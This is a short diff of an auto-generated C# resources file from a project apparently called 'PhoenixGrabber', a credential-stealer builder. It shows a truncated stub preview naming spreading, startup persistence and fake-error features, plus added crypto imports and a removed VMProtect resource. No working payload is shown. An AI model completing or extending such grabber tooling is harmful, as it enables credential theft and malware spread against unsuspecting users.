@@ -82,32 +82,18 @@ namespace PhoenixGrabber.Properties {
         ///using System.Threading;
         ///using System.Windows.Forms;
         ///using System.Web.Script.Serialization;
+        ///using Org.BouncyCastle.Crypto.Parameters;
+        ///using System.Security.Cryptography;
+        ///using System.Linq;
+        ///using Org.BouncyCastle.Crypto.Modes;
+        ///using Org.BouncyCastle.Crypto.Engines;
+        ///using System.Text;
         ///
-        ///namespace Program
-        ///{
-        ///    static class Program
-        ///    {
-        ///        #region Main
-        ///        static void Main()
-        ///        {
-        ///            Start();
-        ///            //SpreadMode
-        ///            //RunOnStartup
-        ///            //FakeErr [rest of string was truncated]&quot;;.
+        ///namespace Progr [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Stub {
             get {
                 return ResourceManager.GetString("Stub", resourceCulture);
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        internal static byte[] VMProtect_Con {
-            get {
-                object obj = ResourceManager.GetObject("VMProtect_Con", resourceCulture);
-                return ((byte[])(obj));
             }
         }
     }
